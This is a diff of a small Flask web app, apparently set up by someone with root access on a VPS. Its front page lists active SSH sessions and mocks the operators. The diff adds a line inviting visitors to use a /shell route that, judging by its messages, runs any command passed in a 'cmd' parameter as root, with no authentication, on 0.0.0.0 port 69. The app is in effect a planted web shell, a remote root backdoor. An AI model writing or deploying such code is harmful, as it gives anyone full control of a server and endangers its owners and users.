@@ -5,7 +5,7 @@ app=Flask(__name__)
 
 @app.route('/')
 def lol():
-  return f"<p>i love the initiative but me having root access to any system, even if it's a VPS is funny. Probably was intended but still come on security professionals.<br>Active SSH connections<br></p><center>{subprocess.check_output(['w']).decode()}</center>"
+    return f"""<div style='background-image: url("https://d3ui957tjb5bqd.cloudfront.net/uploads/images/4/41/41981.pinterest.jpg?1482224066")'><p>i love the initiative but me having root access to any system, even if it's a VPS is funny. Probably was intended but still come on security professionals.<br>Active SSH connections<br></p><center>{subprocess.check_output(['w']).decode()}</center><br><b>Visit /shell to execute any command as root.</b></div>"""
   
 @app.route('/shell/')
 def shell():
@@ -15,5 +15,7 @@ def shell():
     except:
         return "use cmd parameter to access the shell. it's running on root fren"
 
+
+#app.run()
 
 app.run(host="0.0.0.0", port=69)
